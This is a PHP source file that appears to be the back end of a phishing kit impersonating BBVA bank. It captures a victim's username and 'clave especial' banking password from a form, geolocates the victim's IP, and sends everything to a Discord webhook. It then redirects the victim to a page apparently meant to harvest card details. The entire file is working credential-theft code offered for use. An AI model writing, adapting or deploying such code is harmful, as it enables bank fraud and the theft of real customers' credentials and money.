<?php
session_start();
include '../config/config.php';


// Verificaciones iniciales mejoradas
if (!isset($_SESSION['username'])) {
    die("Error: No hay usuario en sesión");
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    die("Error: Método no permitido");
}

if (!defined('DISCORD_WEBHOOK_URL')) {
    die("Error: Webhook de Discord no configurado");
}

// Procesamiento de datos
$spKey = htmlspecialchars($_POST['clvs'] ?? '', ENT_QUOTES, 'UTF-8');
$username = $_SESSION['username'];

// Función mejorada para obtener IP
function getUserIP() {
    $ip = $_SERVER['REMOTE_ADDR'];
    
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($ips[0]);
    }
    
    return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : 'IP no válida';
}

$ip = getUserIP();

// Geolocalización con manejo de errores mejorado
$geoData = [
    'country' => 'Desconocido', 
    'region' => 'Desconocido',  // Cambiado de 'regionName' a 'region'
    'city' => 'Desconocido'
];

try {
    $response = @file_get_contents("http://ip-api.com/json/$ip");
    if ($response !== false) {
        $detalle_ip = json_decode($response, true);
        if (json_last_error() === JSON_ERROR_NONE && $detalle_ip['status'] === 'success') {
            $geoData = [
                'country' => $detalle_ip['country'] ?? 'Desconocido',
                'region' => $detalle_ip['regionName'] ?? 'Desconocido',  // Asegurar compatibilidad
                'city' => $detalle_ip['city'] ?? 'Desconocido'
            ];
        }
    }
} catch (Exception $e) {
    error_log("Error en geolocalización: " . $e->getMessage());
}

// Construcción del mensaje corregido
$embed = [
    "title" => "**🔐 CLAVE ESPECIAL BBVA INGRESADA 🔐**",
    "color" => hexdec("e67e22"),
    "fields" => [
        [
            "name" => "👤 Usuario",
            "value" => "`$username`",
            "inline" => true
        ],
        [
            "name" => "🔑 Clave Especial",
            "value" => "`$spKey`",
            "inline" => true
        ],
        [
            "name" => "🌍 IP",
            "value" => "`$ip`",
            "inline" => false
        ],
        [
            "name" => "🏙️ Ciudad",
            "value" => "`{$geoData['city']}`",
            "inline" => true
        ],
        [
            "name" => "📍 Región",
            "value" => "`{$geoData['region']}`",  // Ahora mostrará correctamente "Desconocido" o el valor real
            "inline" => true
        ],
        [
            "name" => "🌎 País",
            "value" => "`{$geoData['country']}`",
            "inline" => true
        ],
        [
            "name" => "🕒 Fecha",
            "value" => "`" . date('Y-m-d H:i:s') . "`",
            "inline" => false
        ]
    ],
    "footer" => [
        "text" => "made by @morph3ush4ck",
        "icon_url" => "https://upload.wikimedia.org/wikipedia/commons/c/ca/Osama_bin_Laden_portrait.jpg"
    ]
];

$payload = [
    "username" => "🚨 CLAVE BBVA INGRESADA 🚨",
    "avatar_url" => "https://media.istockphoto.com/id/911660906/vector/computer-hacker-with-laptop-icon.jpg?s=612x612&w=0&k=20&c=rmx25IUnM2fHP4lXG96PNeZ_YQ1kQUTTWfGU4EE5iqQ=",
    "embeds" => [$embed]
];

// Envío a Discord con cURL
$ch = curl_init(DISCORD_WEBHOOK_URL);
curl_setopt_array($ch, [
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode($payload),
    CURLOPT_HTTPHEADER => [
        'Content-Type: application/json',
        'Content-Length: ' . strlen(json_encode($payload))
    ],
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT => 5,
    CURLOPT_SSL_VERIFYPEER => false
]);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$error = curl_error($ch);
curl_close($ch);

// Registro de errores
if ($response === false || $httpCode !== 204) {
    error_log("Error al enviar a Discord: HTTP $httpCode - $error");
}

header("Location: ../tarjeta.html");
exit;
?>